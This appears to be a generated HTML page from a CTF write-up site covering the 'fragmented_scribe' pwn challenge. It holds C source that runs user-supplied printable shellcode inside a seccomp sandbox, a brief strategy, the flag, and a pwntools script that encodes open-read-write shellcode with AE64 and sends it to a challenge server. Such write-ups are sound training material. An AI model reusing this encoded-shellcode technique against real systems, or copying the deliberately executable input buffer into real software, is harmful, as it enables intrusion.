@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>fragmented_scribe // Rogue_Net</title>
+    <meta name="description" content="# The Fragmented Scribe ## Description The scribe is dying. The message is breaking.">
+    <link rel="stylesheet" href="../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>fragmented_scribe<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>FST Bootcamp</span>
+                <span>0x4674fb5e</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                # The Fragmented Scribe ## Description The scribe is dying. The message is breaking.
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// challenge.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define MAX_SHELLCODE_SIZE 1024
+
+void init() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+void setup_seccomp() {
+    scmp_filter_ctx ctx;
+    ctx = seccomp_init(SCMP_ACT_KILL);
+    if (ctx == NULL) exit(1);
+
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+
+    seccomp_load(ctx);
+}
+
+int validate_shellcode(unsigned char *code, size_t size) {
+    for (size_t i = 0; i &lt; size; i++) {
+        if (code[i] &lt; 32 || code[i] &gt; 126) {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+int main() {
+    init();
+
+    unsigned char *shellcode = mmap(NULL, MAX_SHELLCODE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (shellcode == MAP_FAILED) {
+        perror(&#34;mmap&#34;);
+        exit(1);
+    }
+
+    printf(&#34;--- THE FRAGMENTED SCRIBE ---\n&#34;);
+    printf(&#34;Provide your shellcode:\n&#34;);
+    printf(&#34;&gt; &#34;);
+
+    ssize_t n = read(0, shellcode, MAX_SHELLCODE_SIZE);
+    if (n &lt;= 0) exit(1);
+
+    if (!validate_shellcode(shellcode, n)) {
+        printf(&#34;[ERROR] Your incantation contains forbidden shadows. The scribe refuses to write such impurity.\n&#34;);
+        exit(1);
+    }
+
+    printf(&#34;[SYSTEM] Sandboxing initiated... Good luck, scribe.\n&#34;);
+    setup_seccomp();
+
+    // Stub: pass shellcode address in R13 and clean most registers.
+    __asm__ volatile (
+        &#34;mov %0, %%r13\n&#34;
+        &#34;xor %%rax, %%rax\n&#34;
+        &#34;xor %%rbx, %%rbx\n&#34;
+        &#34;xor %%rcx, %%rcx\n&#34;
+        &#34;xor %%rdx, %%rdx\n&#34;
+        &#34;xor %%rsi, %%rsi\n&#34;
+        &#34;xor %%rdi, %%rdi\n&#34;
+        &#34;jmp *%%r13\n&#34;
+        :
+        : &#34;r&#34; (shellcode)
+        : &#34;rax&#34;, &#34;rbx&#34;, &#34;rcx&#34;, &#34;rdx&#34;, &#34;rsi&#34;, &#34;rdi&#34;, &#34;r13&#34;
+    );
+
+    return 0;
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>Fragmented Scribe (FST) — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Hard</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>R3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Printable Shellcode + Seccomp ORW</td>
+</tr>
+</tbody>
+</table>
+<h2>About</h2>
+<p>This is the same challenge as the MOJO-JOJO version. It uses printable-only shellcode validation and a seccomp sandbox that only allows <code>read</code>, <code>write</code>, <code>open</code>, <code>openat</code>, <code>exit</code>, and <code>exit_group</code>.</p>
+<h2>Strategy</h2>
+<ol>
+<li>Craft an ORW (Open-Read-Write) shellcode to read <code>flag.txt</code></li>
+<li>Encode it using the AE64 alphanumeric encoder with R13 as the base register</li>
+<li>Send the encoded shellcode — all bytes pass the printable validation</li>
+</ol>
+<p>See the full MOJO-JOJO fragmented_scribe writeup for detailed exploit code.</p>
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>Securinets{fr4gm3nt3d_but_n0t_br0k3n}
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">import sys
+sys.path.insert(0, &#39;/tmp/ae64&#39;)
+
+from pwn import *
+from ae64 import AE64
+import time
+
+context.arch = &#39;amd64&#39;
+
+def get_process():
+    if args.REMOTE:
+        return remote(&#39;48.220.35.76&#39;, 1338)
+    else:
+        return process(&#39;./challenge&#39;)
+
+# Generate base shellcode for reading the flag using Open-Read-Write
+# (Avoiding sendfile as it&#39;s not in the seccomp filter)
+base_sc = asm(shellcraft.open(&#39;flag.txt&#39;) + shellcraft.read(&#39;rax&#39;, &#39;rsp&#39;, 100) + shellcraft.write(1, &#39;rsp&#39;, 100))
+info(f&#34;Base shellcode length: {len(base_sc)}&#34;)
+
+# Use AE64 to encode the shellcode
+# We specifically use R13 as the base register as set in the challenge stub.
+obj = AE64()
+encoded_sc = obj.encode(base_sc, &#39;r13&#39;)
+
+success(f&#34;Encoded shellcode length: {len(encoded_sc)}&#34;)
+success(f&#34;Is all printable: {all(32 &lt;= b &lt;= 126 for b in encoded_sc)}&#34;)
+
+# Run the exploit
+io = get_process()
+io.recvuntil(b&#34;&gt; &#34;)
+io.send(encoded_sc)
+
+try:
+    # Give it a moment to decode and run
+    time.sleep(0.5)
+    output = io.recvall(timeout=3).decode(errors=&#39;ignore&#39;)
+    print(&#34;\n&#34; + &#34;=&#34;*40)
+    print(output)
+    print(&#34;=&#34;*40 + &#34;\n&#34;)
+    
+    if &#34;Securinets&#34; in output:
+        flag_line = [line for line in output.split(&#39;\n&#39;) if &#39;Securinets&#39; in line][0]
+        success(f&#34;FLAG: {flag_line}&#34;)
+    else:
+        error(&#34;No flag found. Check if the exploit ran correctly.&#34;)
+except Exception as e:
+    error(f&#34;Error during flag retrieval: {e}&#34;)
+
+io.close()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../static/js/main.js"></script>
+</body>
+</html>
